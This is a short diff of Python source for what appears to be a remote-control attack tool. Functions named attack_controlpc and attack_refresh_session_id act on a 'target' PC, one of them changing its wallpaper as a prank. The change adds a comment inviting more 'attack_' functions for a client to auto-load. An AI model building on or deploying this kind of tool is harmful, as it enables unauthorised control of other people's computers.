@@ -236,7 +236,7 @@ def attack_controlpc(target, duration=60):
                 elif troll_cmd == "change_wallpaper":
                     ctypes.windll.user32.SystemParametersInfoW(20, 0, None, 0)
                 
-    except Exception:
+    except Exception as e:
         pass
 
 def attack_refresh_session_id(target, duration=0):
@@ -318,3 +318,6 @@ def attack_refresh_session_id(target, duration=0):
             'timestamp': datetime.now().isoformat()
         }
         return f"SESSION_DATA:{json.dumps(error_data)}"
+
+# You can add more attack functions here and they will be automatically loaded by the client
+# Just make sure they start with 'attack_' prefix
